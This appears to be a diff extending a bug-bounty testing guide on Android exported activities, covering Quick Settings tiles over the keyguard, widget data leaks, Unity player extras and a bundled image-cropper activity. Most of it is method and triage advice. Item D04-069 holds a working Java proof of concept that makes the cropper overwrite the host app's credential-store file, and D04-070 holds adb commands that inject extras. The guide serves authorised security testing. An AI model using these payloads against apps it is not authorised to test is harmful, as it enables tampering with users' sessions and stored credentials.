@@ -12,7 +12,7 @@
 | **Milestones** | M3, M5, M7 |
 | **VRT ceiling** | `broken_authentication_and_session_management.authentication_bypass` (P1) — reached when an exported activity renders or mutates account state and the **backend honours it**. Failing that, `broken_access_control.exposed_sensitive_android_intent` (null = rated on what it exposes). |
 | **Primary attacker model** | AM-03 zero-permission local app. AM-02 where a `BROWSABLE` filter also reaches the same activity; AM-04 for every overlay item (`SYSTEM_ALERT_WINDOW` is user-granted); AM-10/AM-11 for the lock-screen and Recents items. |
-| **Maps to** | MASVS-PLATFORM-1, MASVS-PLATFORM-3, MASVS-AUTH-1; MASTG-TEST-0364, MASTG-TEST-0340, MASTG-TEST-0289, MASTG-TEST-0291, MASTG-TECH-0160, MASTG-TECH-0164, MASTG-TOOL-0015; MASWE-0018, MASWE-0036, MASWE-0038, MASWE-0039; CWE-306, CWE-862, CWE-863, CWE-926, CWE-927, CWE-1021; ATT&CK T1417.002, T1516, T1626, T1628.001, T1655.001 |
+| **Maps to** | MASVS-PLATFORM-1, MASVS-PLATFORM-3, MASVS-AUTH-1; MASTG-TEST-0364, MASTG-TEST-0340, MASTG-TEST-0289, MASTG-TEST-0291, MASTG-TECH-0160, MASTG-TECH-0164, MASTG-TOOL-0015; MASWE-0018, MASWE-0023, MASWE-0036, MASWE-0038, MASWE-0039, MASWE-0040; CWE-306, CWE-862, CWE-863, CWE-926, CWE-927, CWE-1021; ATT&CK T1417.002, T1516, T1626, T1628.001, T1655.001 |
 
 ## Why this domain pays
 
@@ -64,7 +64,8 @@ choice?**
 9. **Task hijacking.** Only after you have read `minSdkVersion`. Below that gate it is a demo; above it, a manifest-hygiene note.
 10. **UI redress.** Only with a demonstrated *trigger* and a *named irreversible action*. Overlay-without-timing recordings do not survive triage.
 11. **Recents and `FLAG_SECURE`.** Almost always a ruled-out entry. Write the negative with the black `screencap` as evidence.
-12. **Crash fuzzing.** Run it because it is nearly free, but treat every crash as a triage-ordering signal, not a finding.
+12. **Framework- and library-contributed activities.** The register contains components your client's developers never wrote — an engine player activity, a cropper, a dev menu. Read them by class name, not by package prefix.
+13. **Crash fuzzing.** Run it because it is nearly free, but treat every crash as a triage-ordering signal, not a finding.
 
 ## Items
 
@@ -2459,6 +2460,223 @@ choice?**
 - **Ruled out when:** n/a — this is a gate. Its failure mode is a retracted Critical against production
   infrastructure, which costs more than the finding was worth.
 
+### D04-068 · Quick Settings `TileService` performs its action, or launches its activity, over the keyguard
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null — rated on what the tile exposes); `broken_authentication_and_session_management.authentication_bypass` (P1) only where the tile reaches account data across a user boundary |
+| **Attacker** | AM-10 physical locked |
+| **Applies to** | apps shipping a Quick Settings tile; API 24+ for `TileService`, API 34+ for the `startActivityAndCollapse(PendingIntent)` form |
+| **Maps to** | `develop/ui/views/quicksettings-tiles` — the docs state directly: "Your tile may display on top of the lock screen on locked devices", and supply `isLocked()`, `isSecure()` and `unlockAndRun(Runnable)` as the guards; MASWE-0023 (Step-Up Authentication Not Implemented) |
+
+- **Test:** A Quick Settings tile is tappable from the shade on a **locked** device. A tile whose `onClick()`
+  performs a privileged action — start a transfer, reveal a balance, toggle a security feature, or
+  `startActivityAndCollapse` into a screen showing account data — with no `isLocked()`/`isSecure()` guard is
+  reachable by anyone with thirty seconds of physical access and no credential. This is the sibling of
+  D04-056: `showWhenLocked` is the manifest route to the same boundary, the tile is the user-facing one.
+- **How:**
+  ```bash
+  grep -nA8 'android.service.quicksettings.action.QS_TILE' out/AndroidManifest.xml
+  grep -rnE 'class .*TileService|onClick\(|isLocked\(\)|isSecure\(\)|unlockAndRun|startActivityAndCollapse' out/sources/
+  ```
+  On device: add the tile through the shade editor, set a real PIN, then:
+  ```bash
+  adb shell input keyevent KEYCODE_SLEEP; adb shell input keyevent KEYCODE_WAKEUP   # locked, screen on
+  adb shell cmd statusbar expand-settings
+  adb shell uiautomator dump /sdcard/lock.xml && adb pull /sdcard/lock.xml
+  adb shell dumpsys window | grep -E 'mDreamingLockscreen|KeyguardController'
+  ```
+  Tap the tile, then re-dump and diff the two hierarchies.
+- **Proof:** The action completing, or the launched activity's own view hierarchy present in
+  `uiautomator dump`, while `dumpsys window` shows the keyguard still up. The XML dump is the
+  screenshot-independent artefact and survives a `FLAG_SECURE` screen that refuses `screencap`.
+- **Escalation:** Pre-unlock reachability plus the deep-link router (D04-058) lets a locked-device attacker
+  drive arbitrary in-app routes; pair with D04-071 for the widget surface and D25 for an NFC or
+  USB-attach trigger that needs no touch at all.
+- **Ruled out when:** `onClick()` calls `isLocked()`/`isSecure()` and routes through `unlockAndRun(...)`
+  before any privileged work — verified by tapping the tile while locked and observing the keyguard
+  credential prompt appear before anything else happens. A tile that only toggles a non-security preference
+  is also a clean negative; record which tile and what it toggles. The app shipping no `QS_TILE` service at
+  all is the simplest negative — show the empty `grep`.
+
+### D04-069 · A bundled library's exported activity writes to a caller-supplied `Uri` inside the host app's private storage
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null — rated on the file overwritten); `broken_authentication_and_session_management.authentication_bypass` (P1) where the overwritten file is the session/credential store and you show the resulting auth-state change |
+| **Attacker** | AM-03 zero-permission local app; AM-08 where the library itself is the supply-chain vector |
+| **Applies to** | apps bundling `com.theartofdev.edmodo:android-image-cropper:2.8.+`, `com.github.arthurhub:android-image-cropper:2.7.0` or `com.vanniktech:android-image-cropper` below 4.7.0 — and, as a class, any library activity that accepts a destination `Uri` from an extra |
+| **Maps to** | Oversecured SDK-security write-up — "Unvalidated `customOutputUri` parameter allowed writing to arbitrary paths including credential stores", chain `Bundle extras → Uri.Builder → customOutputUri → overwrites SecureStore.xml`; axeploit/dev.to root-cause analysis of `BitmapUtils.writeBitmapToUri` ("accepts the attacker-controlled Uri and writes to it directly, with no validation of the destination path, the file extension, or whether an existing file would be overwritten"); CanHub CHANGELOG 4.7.0 (2025-11-27) "Security: Added URI validation to prevent file system manipulation (fixes #613)". **No CVE was assigned — say so in the report so triage does not close it on "no CVE".** |
+
+- **Test:** The exported-activity register (D04-001) contains components the app's own developers never
+  wrote. A library activity that takes a destination `Uri` from an intent extra and writes to it, without
+  confining the destination to the library's own directory, is an arbitrary file write **performed by the
+  host app's UID inside the host app's private storage** — reachable from any installed app.
+- **How:** Establish presence under every coordinate the family has used, because an SCA rule keyed on one
+  `groupId` sees at most a third of a forked library:
+  ```bash
+  ./gradlew :app:dependencies --configuration releaseRuntimeClasspath > deps.txt
+  grep -niE "theartofdev|arthurhub|canhub|vanniktech" deps.txt
+  grep -rniE "com\.theartofdev|com\.github\.arthurhub|com\.canhub|com\.vanniktech" \
+    --include='*.gradle' --include='*.gradle.kts' --include='*.toml' .
+  grep -rn "jitpack.io" --include='*.gradle*' --include='settings.gradle*' .
+  # class-level check — survives coordinate renaming and JitPack mirrors of archived forks entirely
+  jadx -d out base.apk
+  grep -rn "CropImageActivity\|CropImageView\|writeBitmapToUri\|customOutputUri\|CROP_IMAGE_EXTRA_BUNDLE\|CROP_IMAGE_EXTRA_OPTIONS" out/sources/
+  grep -n "CropImageActivity" out/AndroidManifest.xml
+  ```
+  Then drive it from the zero-permission PoC (D04-005):
+  ```java
+  Intent i = new Intent();
+  i.setClassName("com.target.app", "com.canhub.cropper.CropImageActivity");
+  Bundle b = new Bundle();
+  b.putParcelable("CROP_IMAGE_EXTRA_OPTIONS",
+      optionsWithCustomOutputUri(Uri.parse("file:///data/data/com.target.app/shared_prefs/SecureStore.xml")));
+  i.putExtra("CROP_IMAGE_EXTRA_BUNDLE", b);
+  i.putExtra("CROP_IMAGE_EXTRA_SOURCE", attackerContentUri);
+  startActivity(i);
+  ```
+  Generalise the class beyond this one library — any exported activity whose extras reach a `FileOutputStream`,
+  `openOutputStream` or `writeBitmapToUri`:
+  ```bash
+  grep -rnE 'openOutputStream\(|new FileOutputStream\(|writeBitmapToUri' out/sources/ -B12 \
+    | grep -nE 'getIntent\(\)|getParcelableExtra|EXTRA_OUTPUT|outputUri'
+  ```
+- **Proof:** `stat` or `run-as ls -l` showing the target file's size and mtime changed to your bitmap, plus
+  the impact screenshot: the app failing to read its own credential store on next launch (forced logout, or a
+  crash naming the store). Take the pre-state capture first — this is a state-change finding and needs the
+  five-screenshot pattern (D04-065).
+- **Escalation:** Overwriting a SharedPreferences XML holding a session token or a feature flag is an auth
+  bypass or a forced logout (-> D13); overwriting a WebView cache or config file is -> D10; the library's
+  own read path is -> D07. The abandonment argument is separate and belongs with D02/D17: the ArthurHub
+  repository is unmaintained with development halted at 2.8.0, so no advisory stream will ever flag it and
+  "our scanner says we're clean" is not evidence.
+- **Ruled out when:** The library version in `deps.txt` is at or above the fixed line (CanHub 4.7.0+) **and**
+  the class-level `grep` finds no vulnerable class in the dex, **or** the activity is declared
+  `android:exported="false"` in the merged manifest and a direct start from the zero-permission PoC returns
+  `SecurityException: Permission Denial`. A clean SCA report on its own is never the negative here — the
+  class-level grep is.
+
+### D04-070 · Exported engine/player activity whose extras are consumed by game or framework code
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); rises with what the extra controls |
+| **Attacker** | AM-03 |
+| **Applies to** | Unity Android builds (`com.unity3d.player.UnityPlayerActivity` and subclasses); by extension any engine or framework activity exported as `MAIN`/`LAUNCHER` |
+| **Maps to** | Il2CppDumper README (`dump.cs` contains method and field information); MASTG-TECH-0160 |
+
+- **Test:** Engine-hosted apps export a player activity as `MAIN`/`LAUNCHER` by construction, and the
+  managed code behind it routinely reads intent extras for deep-link payloads, promo codes and debug flags
+  through `AndroidJavaObject`/`currentActivity`. The Java side looks empty in jadx, so the surface is
+  routinely closed without being tested — the extras are read in C#, not in Java. Same trap as the Flutter
+  router in D04-018.
+- **How:**
+  ```bash
+  grep -n -A15 'com.unity3d.player' out/AndroidManifest.xml
+  # recover the managed method/field table, then search it for intent reads
+  # (Il2CppDumper over libil2cpp.so + global-metadata.dat produces dump.cs)
+  grep -nE 'getIntent|AndroidJavaObject|currentActivity|getStringExtra|getBooleanExtra|Application\.absoluteURL' dump.cs | head -40
+  adb shell am start -n com.target.app/com.unity3d.player.UnityPlayerActivity \
+    --es promo x4hd2k9pq --ez debug true --ei level 99
+  ```
+- **Proof:** The `dump.cs` line showing the managed method that reads the extra, paired with an on-device
+  behaviour change when the extra is set — and, where the value reaches the server, the request in the proxy
+  carrying it. A client-only cheat flag is Low; a flag the server trusts is High.
+- **Escalation:** A debug or entitlement flag the backend honours is -> D15 business logic; a URL extra that
+  reaches the engine's web view is -> D10; a payload the engine deserialises is -> D17.
+- **Ruled out when:** The managed dump contains no intent read reachable from the player activity, verified
+  by grepping `dump.cs` for every extra accessor and finding none, **or** every extra the code reads is
+  re-validated server-side — proved by setting the extra and observing the server reject or ignore it in the
+  proxy. "There is no Java code in `MainActivity`" is never the negative.
+
+### D04-071 · The widget or lock-screen surface renders the account data the in-app screen protects
+
+| | |
+|---|---|
+| **Severity ceiling** | Medium |
+| **VRT** | `insecure_data_storage.screen_caching_enabled` (P5) as filed; escalate through `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies) on the data class |
+| **Attacker** | AM-10 physical locked |
+| **Applies to** | apps shipping an `AppWidgetProvider`; especially banking, 2FA, delivery and messaging |
+| **Maps to** | no external identifier verified in the corpus for the widget-content path; contrast with MASTG-TEST-0289/-0291 which cover the task snapshot, and `develop/ui/views/quicksettings-tiles` for the sibling tile surface |
+
+- **Test:** The app may set `FLAG_SECURE` on the balance screen and `VISIBILITY_SECRET` on its notifications
+  and still draw the same balance, OTP, message preview or delivery address into a home-screen widget — which
+  on OEMs that permit keyguard widgets or complications is visible to anyone holding the locked device. The
+  widget is drawn by the system process from `RemoteViews`, so none of the in-app protections apply to it.
+- **How:**
+  ```bash
+  grep -rnE 'AppWidgetProvider|RemoteViews\(|setTextViewText|setImageViewBitmap|setPendingIntentTemplate' out/sources/
+  adb shell dumpsys appwidget | sed -n '/Provider/,/Host/p'
+  # add the widget, then read what it renders without unlocking
+  adb shell input keyevent KEYCODE_SLEEP; adb shell input keyevent KEYCODE_WAKEUP
+  adb exec-out screencap -p > lockscreen_widget.png
+  ```
+- **Proof:** `lockscreen_widget.png` showing the balance, OTP or message body, placed **side by side** with
+  the black `screencap` of the in-app screen that does set `FLAG_SECURE`. That contrast is the finding: the
+  app demonstrably knows the data is sensitive and protects it in one surface and not the other.
+- **Escalation:** A widget whose `setPendingIntentTemplate` also performs the action — "pay again", "approve"
+  — is a tap-to-transact control on the lock screen; that is -> D23, not a disclosure finding. The
+  `PendingIntent` mutability of that template is -> D08.
+- **Ruled out when:** The app ships no widget (`dumpsys appwidget` lists no provider for the package), or the
+  widget renders only non-sensitive placeholders until tapped and the tap routes through the app lock —
+  verified by adding the widget with an account that has a non-zero balance and observing the placeholder. A
+  widget that renders real data on the **home** screen only, on a device where the keyguard forbids widgets,
+  is a weaker variant: state which surface you reproduced on.
+
+### D04-072 · False-positive discipline for the four claims this chapter makes
+
+| | |
+|---|---|
+| **Severity ceiling** | Support |
+| **VRT** | governs every claim in this chapter |
+| **Attacker** | n/a — kill gate |
+| **Applies to** | every item above |
+| **Maps to** | claude-bughunter `bb-methodology` PART 4 — Marker Discipline, the Body-Diff Rule, the Statistical-Sample Rule, Server-Policy-vs-State and the Shell-Loop Ban; `triage-validation` 7-Question Gate |
+
+- **Test:** This domain produces four claim shapes, and each has a matching false positive that triage knows
+  and you must pre-empt.
+  1. **"My extra was reflected / accepted."** Word collision. The marker must be random alphanumeric,
+     **8 or more characters**, no English words and no protocol keywords — `x4hd2k9pq`, never `test`,
+     `AAAA`, `attacker`, `evil`, `payload` or your own domain.
+  2. **"The bypass worked."** A status code is not a differential. A `200` whose body is byte-identical to
+     the baseline is not a bypass.
+  3. **"The overlay lands reliably" / "there is no rate limit on the activity's endpoint".** A single
+     favourable run is jitter.
+  4. **"The sweep found nothing."** A shell array loop that produced zero iterations prints nothing and looks
+     exactly like a clean result.
+- **How:**
+  ```bash
+  # 1. Marker Discipline — search the BASELINE for the marker BEFORE claiming it was accepted
+  M=$(head -c 16 /dev/urandom | base64 | tr -dc 'a-z0-9' | head -c 9)
+  curl -s "$BASELINE_URL" | grep -c "$M"          # must be 0
+  adb shell am start -n com.target.app/.X --es note "$M"
+  # 2. Body-Diff Rule
+  diff <(curl -s "$URL" -H "Authorization: Bearer $GOOD") <(curl -s "$URL") | head
+  # 3. Statistical-Sample Rule — n >= 10 interleaved trials per group, randomised order
+  python3 - <<'PY'
+  import random, statistics, subprocess
+  trials = [("control", c) for c in range(10)] + [("test", t) for t in range(10)]
+  random.shuffle(trials)   # interleave; never run the two groups back to back
+  # record each run's outcome, then compare means and sigma per group
+  PY
+  # 4. Shell-Loop Ban — count results, always
+  wc -l exported_register.txt sweep_rows.txt      # rows must equal activities x extra-sets
+  ```
+- **Proof:** For (1), the marker absent from the baseline and present in the test response. For (2), the
+  byte-level diff in the report. For (3), the distribution — mean, median and sigma per group, with a signal
+  requiring the suspect group's mean at or beyond **2 sigma** from the control's; a single 2x outlier is
+  nothing. For (4), a row count that matches the register.
+- **Escalation:** Apply Server-Policy-vs-State alongside these: an activity that refuses every extra you send
+  is enforcing a fixed policy, not reacting to your input, and that is a negative rather than an
+  unexploitable positive. Establish it by sending a value the app *should* accept and confirming the
+  behaviour differs.
+- **Ruled out when:** n/a — this is a gate. Its failure mode is the four rejected-as-N/A categories:
+  marker collision, status-code-only bypass, single-outlier timing, and a silent sweep read as coverage.
+
 ## Graveyard for this domain
 
 | Observation | Why it is not a finding | What would make it one |
@@ -2475,6 +2693,9 @@ choice?**
 | "`PreferenceActivity` fragment injection crashes the app." | H1 #43988 paid **$0** for exactly this — a reflection crash is not impact. | Landing on a fragment that discloses credentials or bypasses a gate, screenshotted inside the target app (D04-014). |
 | "An overlay is possible over the app." | The attacker cannot know when the confirm button is on screen; triage closes it as theoretical. | The overlay appearing within one frame of the target dialog, three times, with the oracle's timestamped log alongside (D04-049). |
 | "The API behind the bypassed screen returned 400 rather than 401." | A body parser or sanitiser in front of the auth middleware produces exactly this. | The same endpoint with a minimal well-formed `{}` body still returning a domain-field error rather than `401` (D04-009). |
+| "The app bundles a library with a known-vulnerable exported activity." | A coordinate in a dependency tree is inventory, not impact — and the family in D04-069 carries no CVE at all, so a version string proves nothing on its own. | The class present in the dex, the activity reachable from a zero-permission PoC, and the host app's own file demonstrably overwritten (D04-069). |
+| "The widget shows the balance on the home screen." | On a device whose keyguard forbids widgets this needs an already-unlocked phone, which is the owner. | The same render reproduced with the keyguard up, placed beside the black `screencap` of the in-app screen that does set `FLAG_SECURE` (D04-071). |
+| "There is no Java code in `MainActivity`, so the entry point is clean." | Flutter, Unity and React Native read the extras in Dart, C# and JS respectively; jadx shows an empty `onCreate` either way. | The managed/Dart symbol that reads the extra, plus a behaviour change on device when it is set (D04-018, D04-070). |
 
 ## Cross-surface joins
 
@@ -2485,6 +2706,8 @@ choice?**
 - **Bubble metadata × overlay policy (D04-040 + D03 + D04-047).** The permission reviewer confirms the app does not request `SYSTEM_ALERT_WINDOW` and marks the overlay surface closed. The notification reviewer sees `BubbleMetadata` and marks it a UX feature. The join is that a bubble target declared `allowEmbedded="true"` with `setAutoExpandBubble(true)` and `setSuppressNotification(true)` floats over other apps **without any overlay permission** and is exempt from the reasoning that closed the surface.
 - **Exported activity × shadow API version (D04-064 + D15).** The mobile reviewer extracts the endpoint from the activity and tests it with the app's own session. The API reviewer tests the *current* version the web app calls. Neither notices that the activity calls `/api/v1/` while the web app moved to `/api/v3/`, and that v1 never received the object-level authorisation fix — so the IDOR that is closed on the surface everyone tests is open on the one only the app reaches.
 - **`showWhenLocked` × the deep-link router (D04-056 + D04-058 + D25).** The keyguard review finds one benign `showWhenLocked` activity and passes. The router review maps every route and tests them unlocked. The join: the pre-unlock activity contains a link that enters the router, and the router does not know it is running over the keyguard — so a locked device drives arbitrary in-app routes.
+- **Library-contributed exported activity × the SCA report (D04-069 + D02 + D17).** The dependency reviewer runs `osv-scanner`, sees no advisory, and marks the third-party surface clean. The component reviewer enumerates the manifest by the app's own package prefix and never looks at `com.canhub.cropper.CropImageActivity` sitting in it. The join is an exported arbitrary-file-write into the host app's credential store, contributed by a library that is archived, carries no CVE, and therefore no scanner will ever flag — the class-level grep is the only thing that finds it.
+- **Lock-screen tile × the app-lock gate (D04-068 + D04-008 + D13).** The keyguard reviewer tests activities and finds them all gated. The app-lock reviewer confirms the PIN re-arms on background. Neither tests the Quick Settings tile, which Google documents as displaying *on top of* the lock screen and which calls `startActivityAndCollapse` into the same screens both reviews just closed — bypassing the keyguard and the app lock in one tap.
 - **`activity-alias` × the permission review (D04-003 + D03).** The permission reviewer enumerates `<activity>` elements, confirms the sensitive ones are `exported="false"` with a `signature` permission, and writes a clean negative. The alias, which carries its own `exported` and whose `permission` *supplants* the target's, is in a different element the enumeration never visited. The join re-opens every activity the permission review closed.
 
 ## Sources
@@ -2499,4 +2722,5 @@ choice?**
 - **Disclosed HackerOne reports** — #499348 (Twitter Lite, Critical), #283058, #2555949, #532836, #694053, #414101, #1737358, #189793, #43988, #3764217, #3829030, #637194, #1825679, #1784645, #50884, #377107, #161710, #288955, #258460, #1454002, #1408692, #55064, #145402, #951691, #65729, #1061211, #1325649.
 - **Research and write-ups** — TapTrap (USENIX Security 2025, TU Wien, taptrap.click); Oversecured "Gaining access to arbitrary Content Providers" and "Discovering vendor-specific vulnerabilities in Android"; Promon StrandHogg / CVE-2020-0096; the bugscale Samsung S25 `IapReceiver` restart-oracle chain; Yousef Elsheikh `CheckoutActivity`; m_kamal `LoginSelectorActivity`/`orig_uri`; ghandar0x `AuthAnswerActivity`; Raju Kumar `SaveToMediumActivity`; Niraj Kharel's parameter brute-force list; sec-88 "Task Hijacking" and "Exported Activity Hacking"; HackTricks `android-task-hijacking.md`, `tapjacking.md`, `accessibility-services-abuse.md`, `android-checklist.md`; Mobile Hacking Lab "Android Intent Security: Exploiting Exported Components and Deep Links"; YesWeHack Android recon guide; EDB 49563.
 - **Tooling** — drozer `app.activity.info` / `app.activity.start` / `app.activity.forintent` / `app.package.launchintent` and the Intent grammar and flag map verified in `src/drozer/android.py`; objection `android intent launch_activity`, `android hooking get current_activity`, `android ui screenshot` and its FLAG_SECURE control; MobSF rules `task_hijacking`, `task_hijacking2`, `task_affinity_set`, `android_tapjacking`, `exported_intent_filter_exists`, `explicitly_exported`; mobsfscan `android_detect_tapjacking`; mindedsecurity `MSTG-PLATFORM-2_5`, `-2_6`, `-4_3`, `-9_1`, `-9_2`; QARK `task_affinity.py`, `task_reparenting.py`; Carlos Polop's `Tapjacking-ExportedActivity`; az0mb13 `Task_Hijacking_Strandhogg`.
+- **SDK supply chain** — Oversecured's SDK-security write-up on the `android-image-cropper` family (`customOutputUri` → `BitmapUtils.writeBitmapToUri` → host-app credential-store overwrite) and the axeploit/dev.to root-cause analyses; the three coordinates `com.theartofdev.edmodo`, `com.github.arthurhub`, `com.vanniktech`; CanHub CHANGELOG 4.7.0 (2025-11-27) URI-validation fix — no CVE assigned. Il2CppDumper (`dump.cs`) for recovering Unity managed symbols.
 - **claude-bughunter corpus (4,467-star bug-hunting repository)** — the layer-ordering trap, marker discipline, the body-diff rule, the statistical-sample rule, the shell-loop ban, shadow-API behavioural diffing, the five-screenshot evidence pattern and HAR sanitising, the pre-severity gate and retraction discipline, and chain-filing order. These supply D04-005, -009, -060, -064, -065, -066 and -067 and govern every severity claim in the chapter.
